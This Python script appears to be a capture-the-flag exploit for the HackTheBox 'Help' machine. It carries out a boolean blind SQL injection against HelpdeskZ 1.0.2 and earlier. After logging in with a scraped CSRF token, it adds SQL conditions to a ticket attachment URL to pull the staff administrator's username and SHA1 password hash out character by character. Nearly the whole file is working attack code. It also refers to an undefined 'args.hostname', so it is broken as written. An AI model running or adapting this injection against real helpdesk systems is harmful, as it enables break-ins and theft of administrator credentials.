import requests
import argparse

parser = argparse.ArgumentParser(description='Blind SQL Injection Boolean HelpdeskZ <= 1.0.2 (Help hackthebox)')

parser.add_argument("--targetIp", default='10.10.10.121', type=str,
                    help="Login url of HelpDeskZ ex: http://10.10.10.121/support/")

parser.add_argument("--ticketUrl",
                    default='http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6',
                    type=str, help="Url of the user's ticket attachment download link")

parser.add_argument("--email", default=None, type=str, help="Your helpdesk email")

parser.add_argument("--password", default=None, type=str, help="Your helpdesk password")

args = parser.parse_args()


def get_csrf_token(content):
    token = content
    if "csrfhash" not in token:
        return "error"
    token = token[token.find('csrfhash" value="'):len(token)]
    if '" />' in token:
        token = token[token.find('value="') + 7:token.find('" />')]
    else:
        token = token[token.find('value="') + 7:token.find('"/>')]
    return token


def run_injection(session, column, char_limit):
    result = []
    char = 47
    limit = 1
    while char != 123 and limit != char_limit:
        target = args.ticketUrl + " AND ORD(MID((SELECT " + column + " FROM staff ORDER BY id LIMIT 0,1)," + str(
            limit) + ",1))>" + str(char)
        print(target)
        response = session.get(target)
        # SUCCESS, the website show us an error instead of our attachment file
        if "We couldn't find" in response.text:
            result.append(char)
            limit += 1
            char = 47
        # FAIL, file is shown
        else:
            char += 1
    return result


def main():
    session = requests.session()

    r = session.get(args.hostname + "")

    csrf_token = get_csrf_token(r.text)
    if csrf_token == "error":
        print("CSRF token not found")
        exit()

    # Data for login
    login = {
        'do': 'login',
        'csrfhash': csrf_token,
        'email': args.email,
        'password': args.password,
        'btn': 'Login'
    }

    session.post("http://" + args.targetIp + "/?v=login", data=login)
    admin_username = run_injection(session, "username", 20)
    admin_password = run_injection(session, "password", 65)

    admin_password = ''.join(chr(i) for i in admin_password)
    print("sha1:" + admin_password.split("/")[0])
    admin_username = ''.join(chr(i) for i in admin_username)
    print("username:" + admin_username.split("/")[0])


main()
